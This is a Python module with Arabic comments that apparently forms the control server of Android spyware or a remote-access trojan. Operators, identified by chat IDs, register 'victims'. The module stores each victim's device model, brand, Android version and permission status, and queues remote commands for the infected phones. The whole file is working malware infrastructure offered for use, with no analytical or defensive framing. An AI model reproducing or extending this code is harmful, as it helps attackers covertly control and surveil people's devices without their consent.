# victims_manager.py
# ============================================================
# نظام إدارة الضحايا — v7
# إرسال فوري — لا تخزين في Redis
# ============================================================

import json
import time
import uuid
import secrets

# ★★★ استخدام Redis من config فقط ★★★
try:
    from config import redis_client, REDIS_URL
    print("[+] Victims Manager: Using shared Redis")
except Exception as e:
    print(f"[-] Victims Manager: config failed - {e}")
    redis_client = None


# ============================================================
# Helpers
# ============================================================
def _victims_set(chat_id):
    return f"victims:{chat_id}"

def _victim_hash(chat_id, victim_id):
    return f"victim:{chat_id}:{victim_id}"

def _token_map(victim_token):
    return f"victim_token:{victim_token}"

def _cmd_queue(victim_id):
    return f"victim_cmd:{victim_id}"


# ============================================================
# إنشاء ضحية
# ============================================================
def create_victim(chat_id, name, site="general"):
    if not redis_client:
        return None
    try:
        victim_id = uuid.uuid4().hex[:12]
        victim_token = secrets.token_urlsafe(24)
        now = time.time()

        victim_data = {
            "victim_id": victim_id,
            "victim_token": victim_token,
            "chat_id": str(chat_id),
            "name": name[:40],
            "site": site,
            "device_id": "",
            "model": "",
            "brand": "",
            "android": "",
            "sdk": "",
            "status": "pending",
            "created_at": str(now),
            "last_seen": "",
            "first_connection": "",
            "permissions_status": "unknown",
        }

        # ★ pipeline لتقليل العمليات
        pipe = redis_client.pipeline()
        pipe.hset(_victim_hash(chat_id, victim_id), mapping=victim_data)
        pipe.expire(_victim_hash(chat_id, victim_id), 86400 * 30)
        pipe.sadd(_victims_set(chat_id), victim_id)
        pipe.expire(_victims_set(chat_id), 86400 * 30)
        pipe.setex(
            _token_map(victim_token),
            86400 * 30,
            json.dumps({"chat_id": str(chat_id), "victim_id": victim_id})
        )
        pipe.execute()

        print(f"[+] Victim created: {name} | {victim_id}")
        return victim_data
    except Exception as e:
        print(f"[-] create_victim error: {e}")
        return None


def get_victim(chat_id, victim_id):
    if not redis_client:
        return None
    try:
        data = redis_client.hgetall(_victim_hash(chat_id, victim_id))
        return data if data else None
    except Exception:
        return None


def get_all_victims(chat_id):
    if not redis_client:
        return []
    try:
        vids = redis_client.smembers(_victims_set(chat_id))
        if not vids:
            return []
        victims = []
        pipe = redis_client.pipeline()
        for vid in vids:
            pipe.hgetall(_victim_hash(chat_id, vid))
        results = pipe.execute()
        for v in results:
            if v:
                victims.append(v)
        victims.sort(
            key=lambda x: float(x.get("last_seen") or x.get("created_at") or 0),
            reverse=True
        )
        return victims
    except Exception as e:
        print(f"[-] get_all_victims: {e}")
        return []


def find_victim_by_token(victim_token):
    if not redis_client:
        return None
    try:
        raw = redis_client.get(_token_map(victim_token))
        if not raw:
            return None
        info = json.loads(raw)
        chat_id = info["chat_id"]
        victim_id = info["victim_id"]
        v = get_victim(chat_id, victim_id)
        if v:
            v["chat_id"] = chat_id
            v["victim_id"] = victim_id
        return v
    except Exception:
        return None


def register_victim_device(chat_id, victim_id, device_id, info=None):
    if not redis_client:
        return False
    try:
        now = time.time()
        updates = {
            "device_id": device_id,
            "status": "active",
            "last_seen": str(now),
        }
        if not redis_client.hget(_victim_hash(chat_id, victim_id), "first_connection"):
            updates["first_connection"] = str(now)

        if info:
            if info.get("model"): updates["model"] = info["model"]
            if info.get("brand"): updates["brand"] = info["brand"]
            if info.get("android"): updates["android"] = info["android"]
            if info.get("sdk"): updates["sdk"] = str(info["sdk"])

        redis_client.hset(_victim_hash(chat_id, victim_id), mapping=updates)
        return True
    except Exception:
        return False


# ============================================================
# أوامر الضحية
# ============================================================
def queue_victim_command(victim_id, action, **kwargs):
    if not redis_client:
        return False
    try:
        cmd = {"action": action, "id": uuid.uuid4().hex[:8]}
        cmd.update(kwargs)
        queue_key = _cmd_queue(victim_id)
        pipe = redis_client.pipeline()
        pipe.lpush(queue_key, json.dumps(cmd))
        pipe.expire(queue_key, 600)
        pipe.execute()
        print(f"[+] CMD queued: {action} → {victim_id[:8]}")
        return True
    except Exception as e:
        print(f"[-] queue_victim_command: {e}")
        return False


def pop_victim_commands(victim_id, max_count=10):
    if not redis_client:
        return []
    try:
        commands = []
        queue_key = _cmd_queue(victim_id)
        pipe = redis_client.pipeline()
        for _ in range(max_count):
            pipe.rpop(queue_key)
        results = pipe.execute()
        for item in results:
            if item:
                try:
                    commands.append(json.loads(item))
                except Exception:
                    pass
        return commands
    except Exception as e:
        print(f"[-] pop_victim_commands: {e}")
        return []


def has_victim_commands(victim_id):
    """★ تحقق سريع — بدون سحب"""
    if not redis_client:
        return False
    try:
        return redis_client.llen(_cmd_queue(victim_id)) > 0
    except Exception:
        return False


# ============================================================
# ★★★ لا تخزين ★★★
# ============================================================
def add_victim_data(victim_id, data):
    """لا تخزين — الإرسال مباشر"""
    return True


def get_victim_data(victim_id, limit=50):
    """لا يوجد بيانات"""
    return []


# ============================================================
# إدارة الضحايا
# ============================================================
def update_victim_status(chat_id, victim_id, status):
    if not redis_client:
        return False
    try:
        redis_client.hset(_victim_hash(chat_id, victim_id), mapping={
            "status": status,
            "last_seen": str(time.time())
        })
        return True
    except Exception:
        return False


def rename_victim(chat_id, victim_id, new_name):
    if not redis_client:
        return False
    try:
        redis_client.hset(_victim_hash(chat_id, victim_id), "name", new_name[:40])
        return True
    except Exception:
        return False


def delete_victim(chat_id, victim_id):
    if not redis_client:
        return False
    try:
        v = get_victim(chat_id, victim_id)
        pipe = redis_client.pipeline()
        if v and v.get("victim_token"):
            pipe.delete(_token_map(v["victim_token"]))
        pipe.delete(_victim_hash(chat_id, victim_id))
        pipe.srem(_victims_set(chat_id), victim_id)
        pipe.delete(_cmd_queue(victim_id))
        pipe.execute()
        return True
    except Exception as e:
        print(f"[-] delete_victim: {e}")
        return False


def get_victim_stats(chat_id):
    victims = get_all_victims(chat_id)
    stats = {"total": len(victims), "active": 0, "pending": 0}
    for v in victims:
        if v.get("status") == "active":
            stats["active"] += 1
        else:
            stats["pending"] += 1
    return stats
